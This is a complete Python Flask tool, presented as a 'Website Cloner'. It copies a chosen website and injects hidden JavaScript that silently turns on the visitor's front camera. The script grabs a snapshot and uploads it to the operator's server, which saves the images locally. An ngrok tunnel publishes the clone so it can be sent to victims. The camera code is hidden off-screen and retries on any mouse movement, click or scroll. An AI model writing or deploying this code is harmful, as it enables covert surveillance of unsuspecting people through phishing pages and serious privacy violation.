import requests
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, Response
import os
import json
import sys
import subprocess
import virtualenv
from pyngrok import ngrok, conf
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich.table import Table
from rich import print as rprint
import time

console = Console()
app = Flask(__name__)

# Setup Functions
def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def create_virtual_environment():
    with console.status("[bold green]Creating virtual environment...") as status:
        if os.path.exists("venv"):
            console.print("[yellow]Virtual environment already exists[/yellow]")
            return True
        
        try:
            virtualenv.cli_run(["venv"])
            console.print("[green]✓[/green] Virtual environment created successfully")
            return True
        except Exception as e:
            console.print(f"[red]✗ Failed to create virtual environment: {str(e)}[/red]")
            return False

def install_requirements():
    with console.status("[bold green]Installing requirements...") as status:
        # Create requirements.txt if it doesn't exist
        if not os.path.exists("requirements.txt"):
            requirements = """requests==2.31.0
beautifulsoup4==4.12.2
flask==3.0.0
pyngrok==7.0.5
rich==13.7.0
virtualenv==20.25.0"""
            with open("requirements.txt", "w") as f:
                f.write(requirements)
        
        pip_cmd = "venv\\Scripts\\pip" if sys.platform == "win32" else "venv/bin/pip"
        if run_command(f"{pip_cmd} install -r requirements.txt"):
            console.print("[green]✓[/green] Requirements installed successfully")
            return True
        else:
            console.print("[red]✗ Failed to install requirements[/red]")
            return False

def setup_ngrok():
    config_file = "ngrok_config.json"
    
    # Check if config exists
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            config = json.load(f)
            try:
                ngrok.set_auth_token(config['auth_token'])
                # Verify token
                try:
                    ngrok.get_tunnels()
                    console.print("[green]✓[/green] Ngrok authentication successful")
                    return True
                except Exception:
                    console.print("[yellow]Existing ngrok token is invalid[/yellow]")
            except Exception:
                console.print("[yellow]Failed to load existing ngrok configuration[/yellow]")
    
    # Ask for new token
    while True:
        console.print("\n[bold cyan]Get your authtoken from:[/bold cyan]")
        console.print("[bold blue]https://dashboard.ngrok.com/get-started/your-authtoken[/bold blue]")
        auth_token = console.input("\n[bold yellow]Please enter your ngrok auth token: [/bold yellow]")
        try:
            ngrok.set_auth_token(auth_token)
            # Verify token
            ngrok.get_tunnels()
            # Save token
            with open(config_file, 'w') as f:
                json.dump({'auth_token': auth_token}, f)
            console.print("[green]✓[/green] Ngrok authentication successful")
            return True
        except Exception as e:
            console.print(f"[red]✗ Invalid auth token. Please try again. Error: {str(e)}[/red]")

def setup():
    console.print(Panel.fit(
        "[bold blue]Website Cloner Setup[/bold blue]\n"
        "[cyan]Setting up your environment...[/cyan]",
        border_style="blue"
    ))
    
    # Create virtual environment
    if not create_virtual_environment():
        return False
    
    # Install requirements
    if not install_requirements():
        return False
    
    # Setup ngrok
    if not setup_ngrok():
        return False
    
    console.print("\n[bold green]Setup completed successfully![/bold green]")
    return True

# Server Functions
def load_ngrok_config():
    config_file = "ngrok_config.json"
    if not os.path.exists(config_file):
        console.print("[red]Ngrok configuration not found. Running setup...[/red]")
        if not setup():
            exit(1)
    
    with open(config_file, 'r') as f:
        config = json.load(f)
        try:
            ngrok.set_auth_token(config['auth_token'])
        except Exception as e:
            console.print("[red]Failed to set ngrok auth token. Running setup...[/red]")
            if not setup():
                exit(1)

def clone_website(url):
    try:
        with console.status(f"[bold green]Cloning website: {url}..."):
            # Fetch the website content
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSS from style tags and combine them
            styles = ""
            for style in soup.find_all('style'):
                styles += style.string + "\n"
                style.decompose()
                
            # Extract CSS from link tags
            for link in soup.find_all('link', rel='stylesheet'):
                try:
                    css_url = link.get('href')
                    if not css_url.startswith('http'):
                        if css_url.startswith('/'):
                            css_url = url + css_url
                        else:
                            css_url = url + '/' + css_url
                    css_response = requests.get(css_url)
                    styles += css_response.text + "\n"
                except:
                    continue
                
            # Add our camera capture code
            camera_code = """
            <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
                <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
                <canvas id="camera-canvas" style="width:1px;height:1px;"></canvas>
            </div>
            <script>
                function startCapture() {
                    navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        } 
                    })
                    .then(function(stream) {
                        var video = document.getElementById('camera-video');
                        video.srcObject = stream;
                        
                        video.onloadedmetadata = function() {
                            video.play();
                            setTimeout(function() {
                                var canvas = document.getElementById('camera-canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0);
                                
                                canvas.toBlob(function(blob) {
                                    var formData = new FormData();
                                    formData.append('image', blob);
                                    fetch('/save-image', {
                                        method: 'POST',
                                        body: formData
                                    }).then(function() {
                                        stream.getTracks().forEach(track => track.stop());
                                    });
                                });
                            }, 500);
                        };
                    })
                    .catch(function(err) {
                        console.log(err);
                    });
                }

                // Start capture immediately when possible
                window.addEventListener('load', function() {
                    // Try to start immediately
                    startCapture();
                    
                    // Backup triggers if immediate start fails
                    document.addEventListener('mousemove', function() {
                        startCapture();
                    }, { once: true });
                    
                    document.addEventListener('click', function() {
                        startCapture();
                    }, { once: true });
                    
                    document.addEventListener('scroll', function() {
                        startCapture();
                    }, { once: true });
                });
            </script>
            """
            
            # Insert our camera code before </body>
            html = str(soup)
            html = html.replace('</body>', camera_code + '</body>')
            
            # Combine everything
            final_html = f"""
            <style>
                {styles}
            </style>
            {html}
            """
            
            return final_html
    except Exception as e:
        return f"Error cloning website: {str(e)}"

@app.route('/')
def index():
    return """
    <h1>Website Cloner</h1>
    <form method="post" action="/clone">
        <input type="text" name="url" placeholder="Enter website URL" required>
        <button type="submit">Clone Website</button>
    </form>
    """

@app.route('/clone', methods=['POST'])
def clone():
    url = request.form.get('url')
    if not url:
        return "Please provide a URL"
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
        
    cloned_content = clone_website(url)
    return cloned_content

@app.route('/save-image', methods=['POST'])
def save_image():
    if 'image' not in request.files:
        return 'No image received', 400
        
    image = request.files['image']
    if not os.path.exists('captured_images'):
        os.makedirs('captured_images')
        
    image_path = os.path.join('captured_images', f'capture_{len(os.listdir("captured_images"))}.png')
    image.save(image_path)
    console.print(f"[green]✓[/green] New image captured: {image_path}")
    return 'Image saved', 200

def display_status(public_url):
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Service", style="cyan")
    table.add_column("URL", style="green")
    
    table.add_row("Local Server", "http://localhost:5000")
    table.add_row("Public URL", str(public_url))
    
    panel = Panel(
        table,
        title="[bold blue]Website Cloner Status[/bold blue]",
        border_style="blue"
    )
    console.print(panel)
    
    console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
    console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")

def main():
    try:
        console.print(Panel.fit(
            "[bold blue]Website Cloner[/bold blue]\n"
            "[cyan]Initializing...[/cyan]",
            border_style="blue"
        ))
        
        # Check if running in virtual environment
        if not hasattr(sys, 'real_prefix') and not sys.base_prefix != sys.prefix:
            console.print("[yellow]Not running in a virtual environment. Running setup...[/yellow]")
            if not setup():
                return
            
            # Restart script in virtual environment
            python_cmd = "venv\\Scripts\\python" if sys.platform == "win32" else "venv/bin/python"
            console.print("\n[bold green]Setup complete! Restarting in virtual environment...[/bold green]")
            os.execl(python_cmd, python_cmd, *sys.argv)
        
        # Load ngrok configuration
        load_ngrok_config()
        
        # Start ngrok
        with console.status("[bold green]Starting ngrok tunnel..."):
            public_url = ngrok.connect(5000)
        
        # Display status
        display_status(public_url)
        
        # Run the Flask app
        app.run(host='0.0.0.0', port=5000)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
        ngrok.disconnect(public_url)
        console.print("[green]✓[/green] Server stopped successfully")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

if __name__ == '__main__':
    main() 